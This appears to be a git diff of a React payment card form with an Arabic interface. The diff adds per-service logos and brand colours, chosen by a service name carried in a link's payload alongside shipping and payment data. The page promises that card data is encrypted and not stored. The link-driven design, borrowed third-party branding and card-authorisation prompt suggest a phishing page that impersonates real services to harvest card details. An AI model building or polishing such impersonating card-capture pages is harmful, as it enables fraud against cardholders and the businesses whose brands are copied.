@@ -8,6 +8,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -30,6 +31,7 @@ const PaymentCardForm = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
+  const branding = getServiceBranding(serviceKey);
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
@@ -156,10 +158,25 @@ const PaymentCardForm = () => {
         <div
           className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
           }}
         >
           <div className="absolute inset-0 bg-black/30" />
+          
+          {/* Logo Overlay */}
+          {branding.logo && (
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+                <img 
+                  src={branding.logo} 
+                  alt={serviceName}
+                  className="h-12 sm:h-16 w-auto"
+                  onError={(e) => e.currentTarget.style.display = 'none'}
+                />
+              </div>
+            </div>
+          )}
+          
           <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
             <div className="text-right">
               <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
@@ -170,14 +187,14 @@ const PaymentCardForm = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <div className="flex items-center justify-between mb-6 sm:mb-8">
                 <h1 className="text-xl sm:text-3xl font-bold">بيانات البطاقة</h1>
 
                 <div
                   className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                   }}
                 >
                   <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
@@ -188,11 +205,11 @@ const PaymentCardForm = () => {
               <div 
                 className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
                 style={{
-                  background: `${countryData?.primaryColor}10`,
-                  border: `1px solid ${countryData?.primaryColor}30`
+                  background: `${branding.colors.primary}10`,
+                  border: `1px solid ${branding.colors.primary}30`
                 }}
               >
-                <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: countryData?.primaryColor }} />
+                <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
                 <p className="text-xs sm:text-sm">
                   بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
                 </p>
@@ -202,7 +219,7 @@ const PaymentCardForm = () => {
               <div 
                 className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
                 style={{
-                  background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                   minHeight: '180px'
                 }}
               >
@@ -338,7 +355,7 @@ const PaymentCardForm = () => {
                   size="lg"
                   className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                   }}
                 >
                   <span className="ml-2">تفويض البطاقة</span>
